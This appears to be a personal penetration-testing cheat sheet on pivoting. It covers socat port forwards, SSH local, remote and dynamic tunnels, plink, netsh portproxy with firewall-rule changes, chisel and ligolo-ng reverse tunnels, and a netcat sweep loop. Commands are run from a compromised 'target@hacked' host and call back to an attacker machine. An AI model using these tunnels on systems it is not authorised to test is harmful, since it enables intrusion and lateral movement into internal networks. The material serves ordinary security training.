# Port Redirection and Tunnelling


## Simple Port Forwarding

```
+-----------------------------------------------------------------------------+
|                                  WAN | DMZ                                  |
|                                      |                                      |
|                                      |                                      |
|        ATTACKER--------------------MID01--------------------SECRET01        |
|                                      |                                      |
|                                      |                                      |
|                                      |                                      |
+-----------------------------------------------------------------------------+
```

This will set up a port forward such that
- *FROM* ATTACKER we can connect
- *TO* SECRET01 on \<RPORT\>
- *VIA* socat port forward at \<LPORT\> on SECRET01

COMMAND:

`-ddd` for verbosity

```
target@hacked:~$ socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<TARGET_IP>:<RPORT>
```


## SSH Tunnelling

SSH tunnelling is not as basic as port forwarding. The tunnel itself is a connection between two machines through which we can pass traffic, but isn't related to the port forward itself per se.

### SSH Local Port Forwarding

```
+------------------------------------------------------------------------------------+
|                           WAN | DMZ           DMZ | INT                            |
|                               |                   |                                |
|                               |     > > > > >     |                                |
|        ATTACKER-------------MID01-------------SECRET01-------------FINAL01         |
|                               |       (ssh)       |                                |
|                               |                   |                                |
|                               |                   |                                |
+------------------------------------------------------------------------------------+
```

This will set up a port forward such that
- *FROM* ATTACKER we can connect
- *TO* FINAL01 on \<RPORT\>
- *VIA* SSH tunnel between client MID01 listening on \<LPORT\> connecting to server SECRET01 on \<SSHPORT\> which will then forward to \<RPORT\> on FINAL01

PRE-REQUISITE:
- Make sure you have TTY functionality with your shell. E.g., try
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    - `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- **Note:** as low-privilege user, you can't listen on ports below 1024

COMMAND

```
target@hacked:~$ ssh -N -L 0.0.0.0:<LPORT>:<TARGET_IP>:<RPORT> <USER>@<SSHSERVER_IP>

/** Notes
 * -N used to prevent shell from being opened
 * -L for local portforwadring according to input arg
 * With example above: 0.0.0.0 = MID01 (all interfaces), TARGET_IP = FINAL01, SSHSERVER_IP = SECRET01
 */
```

If we want to confirm the tunnel is up and running, can use `ss -ntplu`

### SSH Local Dynamic Port Forwarding

```
+------------------------------------------------------------------------------------+
|                           WAN | DMZ           DMZ | INT                            |
|                               |                   |         +------FINAL02         |
|                               |     > > > > >     |         |                      |
|        ATTACKER-------------MID01-------------SECRET01------+------FINAL01         |
|                               |       (ssh)       |         |                      |
|                               |                   |         +------FINAL03         |
|                               |                   |                                |
+------------------------------------------------------------------------------------+
```

This will set up a port forward such that
- *FROM* ATTACKER we can connect
- *TO* FINAL01, *OR* FINAL02, *OR* FINAL03 on <u>any dynamic</u> \<RPORT\>
- *VIA* SSH tunnel between client MID01 listening on \<LPORT\> connecting to server SECRET01 on \<SSHPORT\> which will then forward to \<RPORT\> on FINAL01/02/03/...

PRE-REQUISITE:
- Make sure you have TTY functionality with your shell. E.g., try
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    - `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- **Note:** as low-privilege user, you can't listen on ports below 1024

COMMAND

```
target@hacked:~$ ssh -N -D 0.0.0.0:<LPORT> <USER>@<SSHSERVER_IP>

/** Notes
 * -N used to prevent shell from being opened
 * -D for dynamic port forward
 * With example above: 0.0.0.0 = MID01 (all interfaces), SSHSERVER_IP = SECRET01
 */
```

Then, we need to set up a SOCKS proxy on attacker machine so we can send data over the tunnel to dynamically specified destinations as per the SOCKS protocol. Do the following:
- `nano /etc/proxychains4.conf`
- Append `socks5 <SSHCLIENT_IP> <LPORT>` to *[ProxyList]*
    - Note: may need to use socks4 instead depending on what protocol is supported. SOCKS5 better though (ideally) because has more support functionality.

```
link@kali:~$ proxychains <COMMAND_TO_FINAL_TARGET>

// e.g. nmap, smbclient, curl etc.
```

### SSH Remote Port Forwarding

```
+------------------------------------------------------------------------------------+
|    +<<<<<<<+              WAN | DMZ           DMZ | INT                            |
|    V       ^                  |                   |                                |
|    V       ^     < < < < <    |                   |                                |
|    V   ATTACKER-------------MID01-------------SECRET01-------------FINAL01         |
|    V       ^       (ssh)      |                   |                                |
|    V       ^                  |                   |                                |
|    +>>>>>>>+                  |                   |                                |
+------------------------------------------------------------------------------------+
```

If a firewall is blocking inbound traffic and prevents standard port forwarding techniques, we can REMOTE port forward instead, which causes the perimeter machine to connect back to our attacking machine creating a SSH tunnel on the loopback interface (on attacker machine) that is compliant with firewall rules.

This tunnel can then be used to port forward to internal target machines in DMZ / INT.

This will set up a port forward such that
- *FROM* ATTACKER we can connect
- *TO* SECRET01 on \<RPORT\>
- *VIA* SSH tunnel between client ATTACKER listening on \<LPORT\> connecting to server also ATTACKER on \<SSHPORT\> which will then forward to \<RPORT\> on SECRET01

PRE-REQUISITE:
- Make sure you have TTY functionality with your shell on perimeter target machine. E.g., try
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    - `python3 -c 'import pty; pty.spawn("/bin/sh")'`

COMMANDS

From ATTACKER

```
// START SSH SERVER
link@kali:~$ sudo systemctl start ssh
link@kali:~$ sudo ss -ntplu
```

From perimeter target (MID01)

```
target@hacked:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
target@hacked:~$ ssh -N -R 127.0.0.1:<SSHPORT>:<TARGET_IP>:<RPORT> <USER>@<ATTACKER_IP>

/** Notes
 * -N used to prevent shell from being opened
 * -R for remote port forwarding according to input arg
 * With example above: 0.0.0.0 = MID01 (all interfaces), TARGET_IP = SERVER01, ATTACKER_IP = ATTACKER, USER = link
 * <SSHPORT> can be any free port on loopback interface
 */
```

Then to use port forward, send traffic from ATTACKER to local interface e.g.

```
link@kali:~$ psql -h 127.0.0.1 -p <SSHPORT> -U <USER>
```

### SSH Remote Dynamic Port Forwarding

```
+------------------------------------------------------------------------------------+
|    +<<<<<<<+              WAN | DMZ           DMZ | INT                            |
|    V       ^                  |        +---???    |                                |
|    V       ^     < < < < <    |        |          |                                |
|    V   ATTACKER-------------MID01------+------SECRET01-------------FINAL01         |
|    V       ^       (ssh)      |        |          |                                |
|    V       ^                  |        +---???    |                                |
|    +>>>>>>>+                  |                   |                                |
+------------------------------------------------------------------------------------+
```

Same use case as above, but for dynamic connection capability.

This will set up a port forward such that
- *FROM* ATTACKER we can connect
- *TO* SECRET01 *OR* ??? on <u>any dynamic</u> \<RPORT\>
- *VIA* SSH tunnel between client ATTACKER listening on \<LPORT\> connecting to server also ATTACKER on \<SSHPORT\> which will then forward to \<RPORT\> on SECRET01/???/???/...

PRE-REQUISITE:
- Make sure you have TTY functionality with your shell on perimeter target machine such as MID01. E.g., try
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    - `python3 -c 'import pty; pty.spawn("/bin/sh")'`

COMMANDS

From ATTACKER

```
// START SSH SERVER
link@kali:~$ sudo systemctl start ssh
link@kali:~$ sudo ss -ntplu
```

From perimeter target (MID01)

```
target@hacked:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
target@hacked:~$ ssh -N -R 127.0.0.1:<SSHPORT> <USER>@<ATTACKER_IP>

/** Notes
 * -N used to prevent shell from being opened
 * -R for remote port forwarding according to input arg
 * With example above: 0.0.0.0 = MID01 (all interfaces), ATTACKER_IP = ATTACKER, USER = link
 * <SSHPORT> can be any free port on loopback interface
 */
```

Then, we need to set up a SOCKS proxy on attacker machine so we can send data over the tunnel to dynamically specified destinations as per the SOCKS protocol. Do the following:
- `nano /etc/proxychains4.conf`
- Append `socks5 127.0.0.1 <SSHPORT>` to *[ProxyList]*
    - Note: may need to use socks4 instead depending on what protocol is supported. SOCKS5 better though (ideally) because has more support functionality.

```
link@kali:~$ proxychains <COMMAND_TO_FINAL_TARGET>

// e.g. nmap, smbclient, curl etc.
```


## Port Redirection for Windows 

### ssh.exe

Windows SSH tools can be located at `%SYSTEMDRIVE%\Windows\System32\OpenSSH` by default. Or try `where ssh`.

Check version: `ssh.exe -V` --> should be > 7.6 for remote dynamic port forwarding.

Same command as on linux, e.g. for remore dynamic port forwarding:

```
C:\Users\target> ssh -N -R <SSHPORT> link@<ATTACKER_IP>
```

### Plink

Plink is the command-line only counterpart to PuTTY and has a lot of functionality that OpenSSH client offers.

**Note:** Plink does not offer remote dynamic port forwarding.

To do, host a server with `plink.exe` on attacker machine and download to Windows:

```
link@kali:~$ find / -name plink.exe 2>/dev/null
link@kali:~$ cp /path/to/plink.exe /var/www/html
```

Download to perimeter target, then:

```
// Note, should maybe make a port-forwarding only user since the password can get logged here when using remote port forwarding.

C:\Users\target> .\plink.exe -ssh -l link -pw yeahlikeimwritingthathere -R 127.0.0.1:<SSHPORT>:<TARGET_IP>:<RPORT> <ATTACKER_IP>
```

This will ask for a SSH key cache prompt (the yes/no question). In some shells, we might not be able to type y if the TTY is not interactive, so we will need to try something like:

```
C:\User\target> cmd.exe /c echo y | .\plink.exe -l link -pw fakemake123 -R 127.0.0.1:<SSHPORT>:<TARGET_IP>:<RPORT> <ATTACKER_IP>
```

- Remember \<SSHPORT\> is the one listening on attacker machine loopback interface and it's where the port forward starts (check "SSH Remote Port Forwarding Section" above). It's where we send commands to to connect to the hidden target machine.

### Netsh

Netsh is native to Windows, but requires administrative privileges. This also means UAC comes into effect, so will be much more likely to work over RDP than raw shells.

Uses *portproxy* subcontext of *interface* context.

```
C:\> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=<EXTERNAL_FACING_INTERFACE> connectport=<RPORT> connectaddress=<TARGET_IP>
```

To confirm:
```
C:\Users\Administrator> netsh -anp TCP | find "<LPORT>"
C:\Users\Administrator> netsh interface portproxy show all
```

Sometimes, we might run into firewall issues. If we have admin rights, then we might as well try bending the rules:

```
C:\Users\Administrator> netsh advfirewall firewall add rule name="<DESCRIPTIVE-RULE-NAME>" protocol=TCP dir=in localip=<EXTERNAL_FACING_INTERFACE> localport=<LPORT> action=allow
```

Remember to delete the rule when we're finished, with

```
C:\Users\Administrator> netsh advfirewall delete rule name="<THAT_DESCRIPTIVE_RULE_NAME>"
```


## Chisel

HTTP Tunnelling: It's similar to SSH tunnelling, but we're hiding our communication in a HTTP tunnel.

```
+------------------------------------------------------------------------------------+
|    +<<<<<<<+              WAN | DMZ           DMZ | INT                            |
|    V       ^                  |        +---???    |                                |
|    V       ^     < < < < <    |        |          |                                |
|    V   ATTACKER-------------MID01------+------SECRET01-------------FINAL01         |
|    V       ^       (http)     |        |          |                                |
|    V       ^                  |        +---???    |                                |
|    +>>>>>>>+                  |                   |                                |
+------------------------------------------------------------------------------------+
```

Same use case as above, but for dynamic connection capability.

This will set up a port forward such that
- *FROM* ATTACKER we can connect
- *TO* SECRET01 *OR* ??? on <u>any dynamic</u> \<RPORT\>
- *VIA* HTTP tunnel between client ATTACKER listening on \<LPORT\> connecting to server also ATTACKER on \<HTTPPORT\> which will then forward to \<RPORT\> on SECRET01/???/???/...

COMMANDS

On attacker machine, set up a server in a directory (NOTE might need to use apache2 - see remote SSH tunnelling):

```
link@kali:~$ sudo cp $(which chisel) /path/to/server/directory
link@kali:~$ chisel server --port <LPORT> --reverse
```

Download the same `chisel` binary to the target machine and run the client:

```
target@hacked:~$ chisel client <ATTACKER_IP>:<LPORT> R:socks > /dev/null 2>&1 &
```

Then proxy traffic through proxychains (see SSH remote tunnelling for info). The default SOCKS proxy \<HTTPPORT\> is `1080`.

So for a shell, we can use the "ProxyCommand" option from OpenSSH:

```
link@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:<HTTPPORT> %h %p' <USER>@<TARGET>
```

- `<TARGET>` is the ultimate end goal machine to compromise
- `%h` = SSH command host IP
- `%p` = SSH command port

### Debugging

Sometimes, it doesn't work. Let's use Tcpdump to see tf goin on:
```
link@kali:~$ sudo tcpdump -nvvvXi <NETWORK_INTERFACE> tcp port <LPORT>
```

Inspect the output when attempting to establish tunnel.

Sometimes, need to use binary compiled with older versions of Go if target does not support newer version: checkout GitHub page below.


## Ligolo-ng

It's a cool tunnel tool that functions like a VPN

Anyways, need to download a binary for proxy (attacker) and agent (pivot target). Find it on release page on GitHub (link at bottom). *Note:* May need to download older or more stable binaries since it's still in alpha release presently.

Requires admin rights on proxy but does not on agent.

Follow this workflow once you copied the agent binary to target:

```
/**** PROXY (ATTACKER) ****/
link@kali:~$ sudo ./proxy -selfcert

// then in ligolo console, show TLS certificate fingerprint and copy for later
>> certificate_fingerprint

// create network interface
>> interface_create --name "ligolo-tunnel-name"
```

```
/**** AGENT (TARGET) ****/
// (11601 is default ligolo port)
C:\> .\agent.exe -connect <ATTACKER_IP>:11601 -accept-fingerprint <TLS_CERTIFICATE_FINERPRINT>
```

```
/**** PROXY (ATTACKER) ****/
// in ligolo console, select session
>> session

// then create tunnel
>> tunnel_start --tun ligolo-tunnel-name

// add route where <ROUTE_IP_RANGE> e.g. 10.4.172.0/24
>> interface_add_route --name ligolo-tunnel-name --route <ROUTE_IP_RANGE>
```

Agent binding can also be achieved to allow internal targets to connect back to your ports. The following command lets the agent receive traffic on AGENT_LISTENER_PORT and forward it to attacker's LPORT:

```
/**** PROXY (ATTACKER) ****/
>> listener_add --addr 0.0.0.0:<AGENT_LISTENER_PORT> --to 127.0.0.1:<LPORT> --tcp
```

More commands and setup help available at https://github.com/nicocha30/ligolo-ng/wiki/Quickstart

Ligolo-ng repo: https://github.com/nicocha30/ligolo-ng


## Automation

- sshuttle: https://github.com/sshuttle/sshuttle


## Quick Commands for Pragmatic Enumeration

- Network interface configuration and routing
    - `ip route`
    - `ip a`
- Quick port scan
    - `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i <PORT>; done`
    - `-zv` - check for listening port without sending data, verbose
    - `-w 1` - ensure lower time-out threshold
